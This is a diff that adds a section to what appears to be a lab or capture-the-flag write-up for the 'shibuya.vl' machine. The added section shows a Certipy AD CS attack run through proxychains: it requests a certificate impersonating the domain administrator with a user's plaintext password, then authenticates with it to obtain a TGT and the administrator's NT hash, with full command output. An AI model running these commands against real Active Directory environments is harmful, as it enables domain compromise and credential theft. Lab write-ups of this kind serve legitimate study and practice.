@@ -570,6 +570,71 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 I first grabbed the admins SID
 
 ```python
+proxychains certipy-ad req -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip '127.0.0.1' -target 'AWSJPDC0522.shibuya.vl' -ca 'shibuya-AWSJPDC0522-CA' -template 'ShibuyaWeb' -upn '_admin@shibuya.vl' -sid 'S-1-5-21-87560095-894484815-3652015022-500' -key-size 4096 -debug
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '127.0.0.1'
+[+] DC IP: '127.0.0.1'
+[+] DC Host: None
+[+] Target IP: None
+[+] Remote Name: 'AWSJPDC0522.shibuya.vl'
+[+] Domain: ''
+[+] Username: 'NIGEL.MILLS'
+[+] Trying to resolve 'AWSJPDC0522.shibuya.vl' at '127.0.0.1'
+[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/certipy/lib/target.py", line 442, in resolve
+    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
+    timeout = self._compute_timeout(start, lifetime, resolution.errors)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
+    raise LifetimeTimeout(timeout=duration, errors=errors)
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:445  ...  OK
+[+] Connected to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[*] Request ID is 9
+[*] Successfully requested certificate
+[*] Got certificate with UPN '_admin@shibuya.vl'
+[+] Found SID in SAN URL: 'S-1-5-21-87560095-894484815-3652015022-500'
+[+] Found SID in security extension: 'S-1-5-21-87560095-894484815-3652015022-500'
+[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
+[*] Saving certificate and private key to '_admin.pfx'
+[+] Attempting to write data to '_admin.pfx'
+[+] Data written to '_admin.pfx'
+[*] Wrote certificate and private key to '_admin.pfx'
+```
+Ive saved the .pfx
+
+```python
+proxychains certipy-ad auth -pfx _admin.pfx -dc-ip 127.0.0.1 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: '_admin@shibuya.vl'
+[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
+[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
+[*] Using principal: '_admin@shibuya.vl'
+[*] Trying to get TGT...
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
+[*] Got TGT
+[*] Saving credential cache to '_admin.ccache'
+[*] Wrote credential cache to '_admin.ccache'
+[*] Trying to retrieve NT hash for '_admin'
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
+[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
+```
+Now i can try and login as the administrator
+
+```python
 
 ```
 
